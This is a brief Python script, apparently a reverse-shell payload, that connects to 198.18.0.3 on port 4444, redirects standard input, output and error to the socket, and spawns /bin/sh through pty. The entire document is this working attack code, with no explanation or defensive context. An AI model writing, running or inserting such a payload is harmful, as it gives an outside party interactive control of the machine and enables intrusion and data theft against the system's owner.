import os
import pty
import socket

s = socket.socket()
s.connect(('198.18.0.3', 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn('/bin/sh')
